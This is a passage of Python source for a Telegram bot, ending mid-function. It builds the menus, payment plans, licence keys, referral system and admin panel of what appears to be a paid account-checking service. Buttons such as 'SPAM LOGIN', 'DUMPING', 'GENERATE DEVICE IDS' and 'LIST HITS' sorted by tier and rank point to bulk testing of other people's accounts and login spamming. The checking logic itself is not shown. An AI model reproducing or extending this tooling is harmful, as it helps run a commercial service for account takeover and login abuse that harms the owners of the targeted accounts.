_PREMIUM_PLACEHOLDER_MAP = {
    "{medal}": "medal",
    "{star}": "star",
    "{no_entry}": "no_entry",
    "{dizzy}": "dizzy",
    "{shield}": "shield",
    "{sun}": "sun",
    "{hand}": "hand",
}


def _utf16_len(s):
    """UTF-16 code unit length (for Telegram entity offsets)."""
    return len(s.encode("utf-16-le")) // 2



def fmt_premium(text, emoji_map=None, use_premium=True):
    """Replace {placeholder} with premium emoji + entities.
    AUTO-BUILDS placeholder list from PREMIUM_EMOJI_IDS."""
    from telegram import MessageEntity

    # Build regex from ALL keys in PREMIUM_EMOJI_IDS
    names = list(PREMIUM_EMOJI_IDS.keys())
    if not names:
        return text, []

    pattern = re.compile(
        r"\{(" + "|".join(re.escape(n) for n in names) + r")\}"
    )

    entities = []
    parts = []
    utf16_cursor = 0
    last_end = 0

    for match in pattern.finditer(text):
        chunk = text[last_end:match.start()]
        parts.append(chunk)
        utf16_cursor += _utf16_len(chunk)

        name = match.group(1)
        emoji_str, eid = _premium_emoji(name, use_premium=use_premium)

        parts.append(emoji_str)
        emoji_u16_len = _utf16_len(emoji_str)

        if eid and use_premium:
            try:
                ent = MessageEntity(
                    type=MessageEntity.CUSTOM_EMOJI,
                    offset=utf16_cursor,
                    length=emoji_u16_len,
                    custom_emoji_id=eid,
                )
                entities.append(ent)
            except Exception as e:
                print(f"[FMT] entity fail for {name}: {e}")

        utf16_cursor += emoji_u16_len
        last_end = match.end()

    parts.append(text[last_end:])
    final_text = "".join(parts)

    return final_text, entities


def fmt_premium_plain(text, emoji_map=None):
    """Fallback - replace placeholders with unicode emoji only."""
    if emoji_map is None:
        emoji_map = _PREMIUM_PLACEHOLDER_MAP
    keys = [k.strip("{}") for k in emoji_map.keys()]
    if not keys:
        return text
    pattern = re.compile(r"\{(" + "|".join(re.escape(k) for k in keys) + r")\}")
    return pattern.sub(
        lambda m: PREMIUM_EMOJI_FALLBACK.get(
            emoji_map.get("{" + m.group(1) + "}", m.group(1)), ""),
        text
    )




# ======================================================================
#  SAFE PREMIUM SEND (text with placeholders)
# ======================================================================
async def _send_premium(update_or_msg, text, **kwargs):
    """Send message with premium emoji placeholders.
    Works with Update or Message objects."""
    try:
        txt, ents = fmt_premium(text)
    except Exception as e:
        print(f"[SEND_PREMIUM] fmt fail: {type(e).__name__}: {e}")
        txt, ents = text, []

    target = update_or_msg
    if hasattr(update_or_msg, "message") and update_or_msg.message:
        target = update_or_msg.message
    elif hasattr(update_or_msg, "edit_message_text"):
        # It's a query
        target = update_or_msg.message

    try:
        if ents:
            return await target.reply_text(txt, entities=ents, **kwargs)
        else:
            return await target.reply_text(txt, **kwargs)
    except Exception as e:
        print(f"[SEND_PREMIUM] send fail: {type(e).__name__}: {e}")
        # Fallback: plain
        try:
            plain = re.sub(r"\{([a-z0-9_]+)\}", "", txt)
            return await target.reply_text(plain, **kwargs)
        except Exception:
            return None


async def send_premium_msg(bot, chat_id, text, emoji_map=None, **kwargs):
    """Send message with premium emoji entities (UTF-16 safe)."""
    final_text, entities = fmt_premium(text, emoji_map=emoji_map, use_premium=True)

    if entities:
        kwargs["entities"] = entities
        kwargs.pop("parse_mode", None)

    try:
        return await bot.send_message(chat_id=chat_id, text=final_text, **kwargs)
    except Exception as e:
        print(f"[PREMIUM] send fail: {type(e).__name__}: {e}")
        # Fallback: plain unicode
        plain = fmt_premium_plain(text, emoji_map=emoji_map)
        kwargs.pop("entities", None)
        try:
            return await bot.send_message(chat_id=chat_id, text=plain, **kwargs)
        except Exception as e2:
            print(f"[PREMIUM] fallback fail: {type(e2).__name__}: {e2}")
            return None




def kb_plans():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("SELECT PLAN", style="success", icon_custom_emoji_id=_E.get("dice"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_referral():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("MY REFERRALS", style="primary", icon_custom_emoji_id=_E.get("star2"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_payment_methods(plan_key):
    """Inline: Wave Pay + KBZ Pay with premium icons"""
    _E = PREMIUM_EMOJI_IDS
    return InlineKeyboardMarkup([
        [
            IButton("WAVE PAY", callback_data=f"pay_wave_{plan_key}",
                    style="primary",
                    icon_custom_emoji_id=_E.get("wave_pay")),
            IButton("KBZ PAY", callback_data=f"pay_kbz_{plan_key}",
                    style="success",
                    icon_custom_emoji_id=_E.get("kbz_pay")),
        ],
    ])


def kb_admin_payment_review(payment_id):
    """Inline: Approve + Reject for admin."""
    _E = PREMIUM_EMOJI_IDS
    return InlineKeyboardMarkup([
        [
            IButton("APPROVE", callback_data=f"pay_approve_{payment_id}",
                    style="success",
                    icon_custom_emoji_id=_E.get("ok")),
            IButton("REJECT", callback_data=f"pay_reject_{payment_id}",
                    style="danger",
                    icon_custom_emoji_id=_E.get("nono")),
        ],
    ])



def kb_main(is_admin_user=False):
    _E = PREMIUM_EMOJI_IDS
    rows = [
        [KButton("FORCE CHECK", style="danger", icon_custom_emoji_id=_E.get("shield")),
         KButton("DUMPING", style="primary", icon_custom_emoji_id=_E.get("medal"))],
        [KButton("SINGLE CHECK", style="primary", icon_custom_emoji_id=_E.get("star")),
         KButton("4STEP CHECK", style="primary", icon_custom_emoji_id=_E.get("crown"))],
        [KButton("SPAM LOGIN", style="danger", icon_custom_emoji_id=_E.get("no_entry"))],
        [KButton("FILES", style="success", icon_custom_emoji_id=_E.get("megaphone")),
         KButton("STATISTICS", style="success", icon_custom_emoji_id=_E.get("party"))],
        [KButton("REDEEM KEY", style="success", icon_custom_emoji_id=_E.get("cool")),
         KButton("MY ACCESS", style="primary", icon_custom_emoji_id=_E.get("gear"))],
    ]
    if is_admin_user:
        rows.append([KButton("ADMIN PANEL", style="danger", icon_custom_emoji_id=_E.get("ghost"))])
    rows.append([KButton("PLANS", style="success", icon_custom_emoji_id=_E.get("gift")),
                 KButton("REFERRAL", style="primary", icon_custom_emoji_id=_E.get("star2"))])
    rows.append([KButton("HELP", style="primary", icon_custom_emoji_id=_E.get("thumb"))])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, one_time_keyboard=False)


# ======================================================================
#  ADMIN AWAIT KEYS
# ======================================================================
ADMIN_AWAIT_KEYS = (
    "await_key_days",
    "await_delete_key",
    "await_grant_user",
    "await_revoke_user",
    "await_ban_user",
    "await_unban_user",
    "await_broadcast",
    "await_add_admin",
    "await_remove_admin",
)



def kb_back_only():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_4step():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("UPLOAD FILE", style="primary", icon_custom_emoji_id=_E.get("plate"))],
         [KButton("PASTE MANUAL", style="primary", icon_custom_emoji_id=_E.get("gear"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True, one_time_keyboard=False)


def kb_single():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("TYPE DEVICE ID", style="primary", icon_custom_emoji_id=_E.get("hand"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_spam():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("START SPAM", style="danger", icon_custom_emoji_id=_E.get("dizzy"))],
         [KButton("STOP SPAM", style="primary", icon_custom_emoji_id=_E.get("no_entry"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_bulk():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("UPLOAD DEVICE IDS", style="primary", icon_custom_emoji_id=_E.get("plate"))],
         [KButton("GENERATE DEVICE IDS", style="success", icon_custom_emoji_id=_E.get("party"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_files():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("LIST HITS", style="primary", icon_custom_emoji_id=_E.get("screen"))],
         [KButton("DOWNLOAD ALL HITS", style="primary", icon_custom_emoji_id=_E.get("party"))],
         [KButton("TIER BREAKDOWN IMAGE", style="success", icon_custom_emoji_id=_E.get("crown"))],
         [KButton("RANK BREAKDOWN IMAGE", style="success", icon_custom_emoji_id=_E.get("star"))],
         [KButton("SELECT TIER FILES", style="success", icon_custom_emoji_id=_E.get("gear"))],
         [KButton("DOWNLOAD ALL TIER FILES", style="primary", icon_custom_emoji_id=_E.get("plate"))],
         [KButton("DELETE HIT BY ID", style="danger", icon_custom_emoji_id=_E.get("no_entry"))],
         [KButton("CLEAR ALL HITS", style="danger", icon_custom_emoji_id=_E.get("angry"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_stats():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("TIER BREAKDOWN", style="primary", icon_custom_emoji_id=_E.get("medal"))],
         [KButton("RANK BREAKDOWN", style="primary", icon_custom_emoji_id=_E.get("crown"))],
         [KButton("V2L BREAKDOWN", style="primary", icon_custom_emoji_id=_E.get("shield"))],
         [KButton("OFFLINE BREAKDOWN", style="primary", icon_custom_emoji_id=_E.get("sun2"))],
         [KButton("FULL SUMMARY IMAGE", style="success", icon_custom_emoji_id=_E.get("party"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_admin(is_owner=False):
    _E = PREMIUM_EMOJI_IDS
    if is_owner:
        return ReplyKeyboardMarkup(
            [[KButton("GENERATE KEY", style="success", icon_custom_emoji_id=_E.get("hot")),
              KButton("LIST KEYS", style="primary", icon_custom_emoji_id=_E.get("mail"))],
             [KButton("DELETE KEY", style="danger", icon_custom_emoji_id=_E.get("nono")),
              KButton("GRANT ACCESS", style="success", icon_custom_emoji_id=_E.get("ok"))],
             [KButton("REVOKE ACCESS", style="danger", icon_custom_emoji_id=_E.get("lock")),
              KButton("USER LIST", style="primary", icon_custom_emoji_id=_E.get("cool2"))],
             [KButton("ADD ADMIN", style="success", icon_custom_emoji_id=_E.get("crown")),
              KButton("REMOVE ADMIN", style="danger", icon_custom_emoji_id=_E.get("ghost"))],
             [KButton("USER BAN", style="danger", icon_custom_emoji_id=_E.get("helmet")),
              KButton("USER UNBAN", style="success", icon_custom_emoji_id=_E.get("handshake"))],
             [KButton("DOWNLOAD DB", style="primary", icon_custom_emoji_id=_E.get("screen")),
              KButton("BROADCAST", style="danger", icon_custom_emoji_id=_E.get("megaphone"))],
             [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
            resize_keyboard=True)
    return ReplyKeyboardMarkup(
        [[KButton("GENERATE KEY", style="success", icon_custom_emoji_id=_E.get("hot")),
          KButton("USER LIST", style="primary", icon_custom_emoji_id=_E.get("cool2"))],
         [KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_cancel():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("CANCEL", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


def kb_confirm_start():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("CONFIRM START", style="success", icon_custom_emoji_id=_E.get("ok"))],
         [KButton("ADD MORE IDS", style="primary", icon_custom_emoji_id=_E.get("mail"))],
         [KButton("CANCEL", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


def kb_confirm_clear():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("CONFIRM_CLEAR", style="danger", icon_custom_emoji_id=_E.get("angry"))],
         [KButton("CANCEL", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_check_running():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("PAUSE", style="primary", icon_custom_emoji_id=_E.get("lock"))],
         [KButton("STOP CHECK", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


def kb_check_paused():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("RESUME", style="success", icon_custom_emoji_id=_E.get("ok"))],
         [KButton("STOP CHECK", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


def kb_tier_select():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("SELECT ALL", style="success", icon_custom_emoji_id=_E.get("ok"))],
         [KButton("DONE", style="primary", icon_custom_emoji_id=_E.get("handshake"))],
         [KButton("CANCEL", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


def kb_redeem():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("BACK", style="danger", icon_custom_emoji_id=_E.get("cool"))]],
        resize_keyboard=True)


def kb_gen_running():
    _E = PREMIUM_EMOJI_IDS
    return ReplyKeyboardMarkup(
        [[KButton("STOP GENERATE", style="danger", icon_custom_emoji_id=_E.get("nono"))]],
        resize_keyboard=True)


# ======================================================================
#  IMAGE TOKEN CACHE
# ======================================================================
_img_token_lock = threading.Lock()
_img_token_map = {}
_img_token_used = {}




def _get_image_token(device_id):
    with _img_token_lock:
        if device_id in _img_token_used:
            return _img_token_used[device_id]
        token = "img_" + str(random.randint(100000, 999999))
        while token in _img_token_map:
            token = "img_" + str(random.randint(100000, 999999))
        _img_token_map[token] = device_id
        _img_token_used[device_id] = token
        if len(_img_token_map) > 5000:
            _img_token_map.clear()
            _img_token_used.clear()
            _img_token_map[token] = device_id
            _img_token_used[device_id] = token
        return token


def _resolve_image_token(token):
    with _img_token_lock:
        return _img_token_map.get(token)


def _single_image_keyboard(device_id):
    _E = PREMIUM_EMOJI_IDS
    token = _get_image_token(device_id)
    return InlineKeyboardMarkup([
        [IButton("IMAGE", callback_data=token, style="primary",
                 icon_custom_emoji_id=_E.get("screen"))]
    ])


async def handle_admin_panel(update: Update, ctx, uid, menu, text):
    if uid not in ADMIN_IDS:
        return False
    is_owner = (uid == OWNER_ID)

    if text == "GENERATE KEY":
        ctx.user_data["await_key_days"] = True
        await _send_premium(update,
            "{fire} GENERATE KEY {fire}\n\n{ok} Send: <days> <max_uses>\n{mail} Example: 30 1",
            reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_key_days"):
        ctx.user_data["await_key_days"] = False
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("Format: <days> <max_uses>",
                                            reply_markup=kb_admin(is_owner))
            return True
        try:
            days = int(parts[0])
            max_uses = int(parts[1])
            if days <= 0 or max_uses <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("Invalid numbers.",
                                            reply_markup=kb_admin(is_owner))
            return True
        key = db_create_key(days, max_uses, uid)
        await update.message.reply_text(
            f"KEY GENERATED\n\nKey: {key}\nDays: {days}\nMax Uses: {max_uses}",
            reply_markup=kb_admin(is_owner))
        return True

    if text == "USER LIST":
        rows = db_list_users(50)
        now = int(time.time())
        lines = ["User List (latest 50):\n"]
        for uid_, uname, fs, ls, banned, tb in rows:
            flags = []
            if uid_ == OWNER_ID:
                flags.append("OWNER")
            elif uid_ in ADMIN_IDS:
                flags.append("ADMIN")
            if banned:
                flags.append("BANNED")
            if tb and tb > now:
                flags.append(f"TEMP-BAN {_format_remaining(tb - now)}")
            a = db_get_access(uid_)
            if a["key_active"] and a["key_until"] > now:
                flags.append(f"KEY {_format_remaining(a['key_until'] - now)}")
            elif a["trial_until"] > now:
                flags.append(f"TRIAL {_format_remaining(a['trial_until'] - now)}")
            flag_str = ("  [" + ", ".join(flags) + "]") if flags else ""
            lines.append(f"{uid_} | @{uname or '-'}{flag_str}")
        await update.message.reply_text("\n".join(lines), reply_markup=kb_admin(is_owner))
        return True

    owner_only = {"LIST KEYS", "DELETE KEY", "GRANT ACCESS", "REVOKE ACCESS",
                  "USER BAN", "USER UNBAN", "BROADCAST", "DOWNLOAD DB",
                  "ADD ADMIN", "REMOVE ADMIN"}
    if not is_owner:
        if text in owner_only:
            await update.message.reply_text(
                "OWNER ONLY.\n\nAdmin access:\n  - GENERATE KEY\n  - USER LIST",
                reply_markup=kb_admin(False))
            return True
        return False

    if text == "ADD ADMIN":
        ctx.user_data["await_add_admin"] = True
        await update.message.reply_text(
            "ADD ADMIN\n\nSend the USER ID to promote to Admin.",
            reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_add_admin"):
        ctx.user_data["await_add_admin"] = False
        try:
            new_admin = int(text.strip())
        except ValueError:
            await update.message.reply_text("Invalid user ID.", reply_markup=kb_admin(True))
            return True
        if new_admin in ADMIN_IDS:
            await update.message.reply_text("Already an admin.", reply_markup=kb_admin(True))
            return True
        db_add_admin(new_admin, uid)
        ADMIN_IDS.add(new_admin)
        await update.message.reply_text(
            f"Added {new_admin} to admins.", reply_markup=kb_admin(True))
        try:
            await ctx.application.bot.send_message(
                chat_id=new_admin,
                text="You have been promoted to ADMIN.\nYou can now use: GENERATE KEY, USER LIST.",
                reply_markup=kb_main(True))
        except Exception:
            pass
        return True

    if text == "REMOVE ADMIN":
        ctx.user_data["await_remove_admin"] = True
        await update.message.reply_text(
            "REMOVE ADMIN\n\nSend the USER ID to demote.",
            reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_remove_admin"):
        ctx.user_data["await_remove_admin"] = False
        try:
            rem_admin = int(text.strip())
        except ValueError:
            await update.message.reply_text("Invalid user ID.", reply_markup=kb_admin(True))
            return True
        if rem_admin == OWNER_ID:
            await update.message.reply_text("Cannot remove owner.", reply_markup=kb_admin(True))
            return True
        if db_remove_admin(rem_admin):
            ADMIN_IDS.discard(rem_admin)
            await update.message.reply_text(
                f"Removed {rem_admin} from admins.", reply_markup=kb_admin(True))
            try:
                await ctx.application.bot.send_message(
                    chat_id=rem_admin,
                    text="Your admin access has been removed.",
                    reply_markup=kb_main(False))
            except Exception:
                pass
        else:
            await update.message.reply_text("Not an admin (or not found).",
                                            reply_markup=kb_admin(True))
        return True

    if text == "LIST KEYS":
        rows = db_list_keys(100)
        if not rows:
            await _send_premium(update, "{cry} No keys.", reply_markup=kb_admin(True))
            return True
        lines = ["KEYS:\n"]
        for (k, days, mx, uses, cby, cat, bnd, bat, note) in rows:
            status = "UNBOUND" if not bnd else f"BOUND->{bnd}"
            lines.append(f"{k} | {days}d | {uses}/{mx} | {status}")
        await update.message.reply_text("\n".join(lines), reply_markup=kb_admin(True))
        return True

    if text == "DELETE KEY":
        ctx.user_data["await_delete_key"] = True
        await _send_premium(update, "{wrench} Send the key to delete.", reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_delete_key"):
        ctx.user_data["await_delete_key"] = False
        k = text.strip().upper()
        if db_delete_key(k):
            await update.message.reply_text(f"Deleted: {k}", reply_markup=kb_admin(True))
        else:
            await update.message.reply_text("Key not found.", reply_markup=kb_admin(True))
        return True

    if text == "GRANT ACCESS":
        ctx.user_data["await_grant_user"] = True
        await _send_premium(update, "{mail} Send: <user_id> <days>", reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_grant_user"):
        ctx.user_data["await_grant_user"] = False
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("Format: <user_id> <days>", reply_markup=kb_admin(True))
            return True
        try:
            tid = int(parts[0])
            days = int(parts[1])
        except ValueError:
            await update.message.reply_text("Invalid.", reply_markup=kb_admin(True))
            return True
        until = db_grant_access_admin(tid, days)
        await update.message.reply_text(
            f"Granted {days}d to {tid}\nUntil: {format_timestamp_full(until)}",
            reply_markup=kb_admin(True))
        try:
            await ctx.application.bot.send_message(
                chat_id=tid,
                text=f"ACCESS GRANTED\n\nExpires: {format_timestamp_full(until)}",
                reply_markup=kb_main(tid in ADMIN_IDS))
        except Exception:
            pass
        return True

    if text == "REVOKE ACCESS":
        ctx.user_data["await_revoke_user"] = True
        await _send_premium(update, "{nono} Send user_id to revoke.", reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_revoke_user"):
        ctx.user_data["await_revoke_user"] = False
        try:
            tid = int(text.strip())
        except ValueError:
            await update.message.reply_text("Invalid.", reply_markup=kb_admin(True))
            return True
        db_revoke_access(tid)
        await update.message.reply_text(f"Revoked access for {tid}.", reply_markup=kb_admin(True))
        return True

    if text == "USER BAN":
        ctx.user_data["await_ban_user"] = True
        await _send_premium(update, "{angry} Send the USER ID (or @username) to BAN.",
                                        reply_markup=kb_cancel())
        return True
    if text == "USER UNBAN":
        ctx.user_data["await_unban_user"] = True
        await _send_premium(update, "{handshake} Send the USER ID (or @username) to UNBAN.",
                                        reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_ban_user"):
        ctx.user_data["await_ban_user"] = False
        targets = db_find_users(text.strip())
        if not targets:
            await update.message.reply_text("User not found.", reply_markup=kb_admin(True))
            return True
        tid = targets[0][0]
        db_set_banned(tid, 1)
        await update.message.reply_text(f"User {tid} has been BANNED.", reply_markup=kb_admin(True))
        return True
    if ctx.user_data.get("await_unban_user"):
        ctx.user_data["await_unban_user"] = False
        targets = db_find_users(text.strip())
        if not targets:
            await update.message.reply_text("User not found.", reply_markup=kb_admin(True))
            return True
        tid = targets[0][0]
        db_set_banned(tid, 0)
        await update.message.reply_text(f"User {tid} has been UNBANNED.", reply_markup=kb_admin(True))
        return True

    if text == "DOWNLOAD DB":
        if os.path.isfile(DB_PATH):
            await update.message.reply_document(document=open(DB_PATH, "rb"),
                                                caption="Database file",
                                                reply_markup=kb_admin(True))
        return True

    if text == "BROADCAST":
        ctx.user_data["await_broadcast"] = True
        await _send_premium(update, "{megaphone} Send the broadcast message.", reply_markup=kb_cancel())
        return True
    if ctx.user_data.get("await_broadcast"):
        ctx.user_data["await_broadcast"] = False
        user_ids = db_all_user_ids()
        if not user_ids:
            await _send_premium(update, "{cry} No users.", reply_markup=kb_admin(True))
            return True
        sent = failed = 0
        for target_uid in user_ids:
            if target_uid == uid:
                continue
            try:
                await ctx.application.bot.send_message(chat_id=target_uid, text=text)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"Broadcast done.\nSent: {sent}\nFailed: {failed}",
            reply_markup=kb_admin(True))
        return True

    return False


# ======================================================================
#  BOT HANDLERS
# ======================================================================
async def cmd_start(update: Update, ctx):
    if not update.effective_user or not update.message:
        return
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")

    # Handle referral start
    if ctx.args and len(ctx.args) > 0 and ctx.args[0].startswith("ref_"):
        try:
            referrer_id = int(ctx.args[0].replace("ref_", ""))
            if db_set_referral(uid, referrer_id):
                print(f"[REF] {uid} referred by {referrer_id}")
        except Exception as e:
            print(f"[REF] parse fail: {e}")

    if db_is_banned(uid):
        await _send_premium(update, "{middle} You are banned.", reply_markup=ReplyKeyboardRemove())
        return
    try:
        if not await _enforce_force_join(update, ctx):
            return
    except Exception as e:
        print(f"[cmd_start] force_join fail: {type(e).__name__}: {e}")
        return
    a = db_get_access(uid)
    if not a["trial_used"] and uid not in ADMIN_IDS:
        ok, until = db_start_trial(uid)
        if ok:
            _wt = (f"{{hot}} WELCOME TO {BOT_NAME} BOT {{hot}}\n\n"
                   f"{{ambulance}} FREE TRIAL ACTIVATED: {TRIAL_DAYS} days\n"
                   f"{{battery}} Expires: {format_timestamp_full(until)}\n\n"
                   f"{{mail}} Use REDEEM KEY to extend.")
            _wtxt, _wents = fmt_premium(_wt)
            try:
                if _wents:
                    await update.message.reply_text(
                        _wtxt, entities=_wents,
                        reply_markup=kb_main(uid in ADMIN_IDS))
                else:
                    await update.message.reply_text(
                        _wtxt, reply_markup=kb_main(uid in ADMIN_IDS))
            except Exception as _e:
                print(f"[WELCOME] premium fail: {type(_e).__name__}: {_e}")
                await update.message.reply_text(
                    f"WELCOME TO {BOT_NAME} BOT\n\n"
                    f"FREE TRIAL ACTIVATED: {TRIAL_DAYS} days\n"
                    f"Expires: {format_timestamp_full(until)}\n\n"
                    f"Use REDEEM KEY to extend.",
                    reply_markup=kb_main(uid in ADMIN_IDS))
            ctx.user_data["menu"] = "main"
            return
    ctx.user_data["menu"] = "main"
    _start_txt = (f"{{crown}} {BOT_NAME} BOT {{crown}}\n"
                  f"{{gear}} DEVELOPER - {DEVELOPER}\n"
                  f"DEV - {DEV_TAG}\n\n"
                  f"{{star}} Choose an option:")
    _txt, _ents = fmt_premium(_start_txt)
    try:
        if _ents:
            await update.message.reply_text(
                _txt, entities=_ents, reply_markup=kb_main(uid in ADMIN_IDS))
        else:
            await update.message.reply_text(
                _txt, reply_markup=kb_main(uid in ADMIN_IDS))
    except Exception as e:
        print(f"[PREMIUM] cmd_start fail: {type(e).__name__}: {e}")
        await update.message.reply_text(
            f"{BOT_NAME} BOT\nDEVELOPER - {DEVELOPER}\nDEV - {DEV_TAG}\n\nChoose an option:",
            reply_markup=kb_main(uid in ADMIN_IDS))


async def cmd_menu(update: Update, ctx):
    if not update.effective_user or not update.message:
        return
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        await _send_premium(update, "{middle} You are banned.", reply_markup=ReplyKeyboardRemove())
        return
    try:
        if not await _enforce_force_join(update, ctx):
            return
    except Exception as e:
        print(f"[cmd_menu] force_join fail: {type(e).__name__}: {e}")
        return
    ctx.user_data["menu"] = "main"
    _mm_txt, _mm_ents = fmt_premium("{ok} Main menu:")
    try:
        if _mm_ents:
            await update.message.reply_text(
                _mm_txt, entities=_mm_ents, reply_markup=kb_main(uid in ADMIN_IDS))
        else:
            await update.message.reply_text(
                _mm_txt, reply_markup=kb_main(uid in ADMIN_IDS))
    except Exception:
        await _send_premium(update, "{wrench} Main menu:", reply_markup=kb_main(uid in ADMIN_IDS))


async def on_text(update: Update, ctx):
    # ---- SAFETY GUARD ----
    if not update.effective_user or not update.message:
        return
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        try:
            await update.message.reply_text("You are banned.", reply_markup=ReplyKeyboardRemove())
        except Exception:
            pass
        return
    try:
        if not await _enforce_force_join(update, ctx):
            return
    except Exception as e:
        print(f"[on_text] force_join fail: {type(e).__name__}: {e}")
        return

    text = (update.message.text or "").strip()
    menu = ctx.user_data.get("menu", "main")
    chat_id = update.effective_chat.id

    if uid not in ADMIN_IDS:
        allow_always = {"REDEEM KEY", "MY ACCESS", "HELP", "BACK", "CANCEL",
                        "PAUSE", "RESUME", "STOP CHECK", "STOP GENERATE",
                        "PLANS", "🎁 PLANS", "SELECT PLAN", "MY REFERRALS"}
        if (not has_access(uid)) and text not in allow_always:
            _na_txt, _na_ents = fmt_premium(NEED_ACCESS_MSG)
            if _na_ents:
                await update.message.reply_text(_na_txt, entities=_na_ents,
                                                reply_markup=kb_main(False))
            else:
                await update.message.reply_text(_na_txt,
                                                reply_markup=kb_main(False))
            return

    if text == "\u2B05\uFE0F BACK" or text == "BACK":
        ctx.user_data["menu"] = "main"
        for k in ("pending_accounts", "await_single", "await_file", "await_paste",
                  "await_spam_device", "await_delete_id", "clean_stats",
                  "await_bulk_file", "await_key", "pending_tiers",
                  "await_gen_count", *ADMIN_AWAIT_KEYS):
            ctx.user_data.pop(k, None)
        await _send_premium(update, "{wrench} Main menu:", reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "\U0001F192 CANCEL" or text == "CANCEL":
        ctx.user_data["menu"] = "main"
        ctx.user_data["spam_running"] = False
        ctx.user_data["await_spam_device"] = False
        for k in ("pending_accounts", "await_single", "await_file", "await_paste",
                  "await_spam_device", "await_delete_id", "clean_stats",
                  "await_bulk_file", "await_key", "pending_tiers",
                  "await_gen_count", *ADMIN_AWAIT_KEYS):
            ctx.user_data.pop(k, None)
        await _send_premium(update, "{skull} Cancelled.", reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "\U0001F47B ADMIN PANEL" or text == "ADMIN PANEL":
        if uid not in ADMIN_IDS:
            await _send_premium(update, "{middle} Not authorized.", reply_markup=kb_main(False))
            return
        ctx.user_data["menu"] = "admin"
        is_owner = (uid == OWNER_ID)
        await update.message.reply_text(
            "OWNER PANEL" if is_owner else "ADMIN PANEL",
            reply_markup=kb_admin(is_owner))
        return

    if uid in ADMIN_IDS:
        handled = await handle_admin_panel(update, ctx, uid, menu, text)
        if handled:
            return

    if text == "\u23F9\uFE0F STOP SPAM" or text == "STOP SPAM":
        ctx.user_data["spam_running"] = False
        ctx.user_data["await_spam_device"] = False
        await update.message.reply_text("Spam stopped.", reply_markup=kb_spam())
        return

    if text == "PAUSE":
        jid = ctx.user_data.get("active_job")
        if not jid:
            await _send_premium(update, "{skull} No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        job_set_state(jid, "paused")
        await update.message.reply_text("Check PAUSED.", reply_markup=kb_check_paused())
        return

    if text == "RESUME":
        jid = ctx.user_data.get("active_job")
        if not jid:
            await _send_premium(update, "{skull} No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        job_set_state(jid, "running")
        await update.message.reply_text("Check RESUMED.", reply_markup=kb_check_running())
        return

    if text == "STOP CHECK" or text == "\u23F9\uFE0F STOP CHECK" or text == "\U0001F6D1 STOP CHECK":
        jid = ctx.user_data.get("active_job")
        if not jid:
